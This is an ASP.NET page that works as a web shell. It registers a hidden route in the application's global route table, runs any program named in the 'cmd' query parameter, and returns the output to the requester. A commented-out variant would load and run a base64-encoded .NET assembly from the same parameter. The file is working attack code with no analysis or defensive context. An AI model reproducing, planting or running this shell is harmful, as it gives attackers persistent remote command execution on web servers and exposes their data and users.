<%@ Page Language="c#"%>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Web.Routing" %>

<script runat="server">
    public class MyRoute : RouteBase
    {
        public override RouteData GetRouteData(HttpContextBase httpContext)
        {
            return null;
        }

        public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
        {
            HttpContext context = HttpContext.Current;
            String Payload = context.Request.QueryString["cmd"];
            if (Payload != null)
            {
                HttpResponseBase response = new HttpResponseWrapper(context.Response);
                Process p = new Process();
                p.StartInfo.FileName = Payload;
                Debug.WriteLine(p.StartInfo.FileName);
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();
                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                response.Write(System.Text.Encoding.Default.GetString(data));
                /*System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);
                context.Response.End();*/
            }
            return null;
        }
    }
</script>

<%
    RouteCollection routes = RouteTable.Routes;
    routes.Insert(0, (RouteBase)new MyRoute());
%>